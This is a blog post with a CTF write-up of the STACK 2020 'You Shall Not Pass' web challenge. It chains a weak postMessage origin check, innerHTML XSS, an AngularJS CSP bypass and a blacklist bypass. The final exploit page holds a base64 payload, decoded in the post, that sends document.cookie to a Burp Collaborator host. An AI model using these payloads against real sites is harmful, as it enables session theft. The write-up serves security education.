---
layout: post
title: STACK 2020 - You Shall Not Pass
modified:
categories: blog/
excerpt:
tags: []
image:
  feature:
share: true
comments: true
date: 2020-12-11T11:23:16+08:00
---

![]({{site.url|append: site.baseurl}}/resources/images/stack/scoreboard.jpg)

STACK 2020 CTF is a capture the flag [organized by GovTech](https://ctf.tech.gov.sg/). We participated as PwningActionParty and achieved third place in the open category.

# Unlock Me
**Category:** Web  
**Description:** 
We discovered a web portal used by COViD as a C2 platform to send messages to his ransomware victims. They have a script that accesses and hacks the websites posted back to the server! Can you stop them?

---

![]({{site.url|append: site.baseurl}}/resources/images/stack/you-shall-not-pass.png){: width="400px"}

The webpage appears to be a simple Command&Control (C2) platform with two feature:

  1. Add a new website to your list of hacked websites.
  2. Broadcast messages to your victims.

### The first step is to try to observe the behavior each feature exhibits

***1. Add a new website to your list of hacked websites***

From monitoring the network requests, we see that a POST request is made to `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/link` with the provided URL in the POST body.

{% highlight linenos %}
GET / HTTP/1.1
Host: as6pzzwc9gyz8zkbzw5zhg00rrxil7.burpcollaborator.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
{% endhighlight %}

Using Burp Collaborator, we can easily see that a HTTP request was made to the URL provided through a headless chrome instance.

However, since the response from the request is not returned to the user, we can't escalate this blind SSRF any further.

***2. Broadcast messages to your victim***

From the network requests, we see that a POST request is made to `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcast`, however, this doesn't seem to result in any network call(s) made to the victim URL from feature 1.

{% highlight javascript linenos %}
    var broadcastForm = document.getElementById('broadcastForm');
    broadcastForm.addEventListener('submit', async function (event) {
      event.preventDefault();
      event.stopPropagation();
      var searchData = new FormData(broadcastForm);
      var broadcast = searchData.get("broadcast");
      var response = await fetch("/broadcast", {
        method: 'POST',
        mode: 'cors',
        cache: 'no-cache',
        credentials: 'same-origin',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          broadcast: broadcast
        })
      });
      console.log(response.status);
      if (response.status === 200) {
        document.getElementById('broadcasts').contentWindow.postMessage(broadcast, "*");
      }
    })
{% endhighlight %}

Looking at the JavaScript code, we can understand that upon a successful response from the backend, the broadcast message is sent to the iFrame using postMessage.

{% highlight javascript linenoes %}
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {
    // verify sender is trusted
    if (
        !/^http:\/\/yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg/.test(
            event.origin
        )
    ) {
        return;
    }

    // display message
    msg = event.data;
    if (msg == "off") {
        document.body.style.color = "#95A799";
    } else if (msg == "on") {
        document.body.style.color = "black";
    } else if (
        !msg.includes(" ") &&
        !msg.includes("'") &&
        !msg.includes("&") &&
        !msg.includes("|") &&
        !msg.includes("%") &&
        !msg.includes("@") &&
        !msg.includes("!") &&
        !msg.includes("#") &&
        !msg.includes("^")
    ) {
        var broadcastList = document.getElementById("broadcastList");
        var newBroadCast = document.createElement("div");
        newBroadCast.innerHTML =
            '<li class="list-group-item d-flex justify-content-between lh-condensed"><h6 class="my-0">' +
            msg +
            "</h6></li>";
        while (newBroadCast.firstChild) {
            broadcastList.appendChild(newBroadCast.firstChild);
        }
    }
}
{% endhighlight %}

The iFrame embeds another JavaScript resource, upon receiving a message, it checks the origin of the event and looks for restricted characters before displaying the message. There are two main issues here:

***Insufficient origin check***

Firstly, we can notice that the origin check is insufficient since it doesn't ensure that it checks against the full origin and not just the prefix of the origin.

For example, a regular expression of  `^http:\/\/example.sg` will return true against a URL of `http://example.sg.evil.com`, and thus, it is possible to bypass the origin check.

***HTML Injection/Cross-site Scripting***

Secondly, the message data is then injected using `innerHTML` which would render any HTML element, resulting in XSS. The saving grace here is that your payload is restricted to the list of blacklisted characters that is checked before the content is injected.

### Hypothesis

I was stumped for a bit as it wasn't immediately obvious where the flag is located or what the next steps were, however, if we take a step back to analyze at what we have, we can hypothesis where the flag could be located.

1. In feature #1, the HTTP request is made with a headless chrome, this could imply that certain interaction with the browser might be needed (running JavaScript, service workers, etc).
2. The iframe in feature #2 allows iframing from a different origin, and the insufficient origin check seems to imply that we have to do that. On top of that, the XSS issue further implies that we might need to exploit it in order to get the flag (flag in cookie or some storage accessible from JavaScript).

**With that, I seek out to test my hypothesis.**

### Exploitation

I created a simple webpage located at `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.mydomain.com/exploit.html` in order to bypass the origin check and with the following content.

{% highlight html linenos %}
<html>
<body>
<script>
window.onload = function() {
    document.getElementById('broadcasts').contentWindow.postMessage('<img\tsrc=e\tonerror=alert()>', "*");
}
</script>
<iframe name="broadcasts" id="broadcasts" frameBorder="0" src="http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts"></iframe>
</body>
</html>
{% endhighlight %}

With that, we can test that the HTML injection and origin check bypass does indeed work, however, we are now stumped by the content security policy specified in the iFrame'ed page.

{% highlight linenos %}
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
{% endhighlight %}

The CSP is defined using the meta element, and allows script resources from it's own origin as well as unsafe-eval, and looking at the script resources available to us, we can quickly observe that this CSP can be bypassed using the AngularJS v1.5.6 library. [This is a good blog for a quick start on this topic](https://portswigger.net/research/angularjs-csp-bypass-in-56-characters).

CSP Bypasss Payload: `<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>`

However, one more obstacle, the payload needed uses some of the blacklisted characters (` '&|%@!#^`) that the script is checking for, we need to find a way to bypass the blacklist in order to get our payload successfully injected.

Looking back at the iFrame JavaScript, I realized that instead of posting a string message, I could post an Array object, which when processing through the blacklist checks, will allow me to bypass entirely.

Example:
If `msg` was an Array object `['mypayload']`, `!msg.includes("|")` will be checking that there exists the `"|"` element in the Array, however, that doesn't exist in my payload, and would allow me to bypass the check entirely.

Finally, I can craft  final exploit payload:

{% highlight html linenos %}
<html>
<body>
<script>
window.onload = function() {
    document.getElementById('broadcasts').contentWindow.postMessage([`<iframe srcdoc="<html><body id=eval(atob('dmFyIHg9ZG9jdW1lbnQuY29va2llO3ZhciBjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpO2Muc3JjPSJodHRwOi8vY2V1dWpmYWxld2s0ZG5jN2toem44bWwweXI0aTI2ci5idXJwY29sbGFib3JhdG9yLm5ldC9mbGFnPyIreDtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGMpOw=='))><script src=http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/javascripts/angular.min.js></script><div ng-app ng-csp><div ng-bind=x={y:''.constructor.prototype};x.y.charAt=[].join;[1]|orderBy:'x=eval(document.body.id)'></div></body></html>">`], "*");
}
</script>
<iframe name="broadcasts" id="broadcasts" frameBorder="0" src="http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts"></iframe>
</body>
</html>
{% endhighlight %}

Where I made use of the CSP bypass to evaluate a base64 encoded script that I injected into the body element as an id (this made the payload writing easier without having any single-quote/double-quote restrictions).

The base64 encoded payload is decoded to:

{% highlight javascript linenos %}
var x=document.cookie;var c=document.createElement("img");c.src="http://ceuujfalewk4dnc7khzn8ml0yr4i26r.burpcollaborator.net/flag?"+x;document.body.appendChild(c);
{% endhighlight %}

Which exfiltrates available cookies using an image tag to an attacker-controlled webserver.

And we have the flag: `govtech-csg{V3Ni,v1dI,v!Cl}`

### Recap

In order to obtain the flag, we had to perform the following bypasses:

1. Origin check bypass
2. CSP bypass using Angular JS
3. Bypass blacklist of characters
4. HTML injection resulting in JavaScript execution
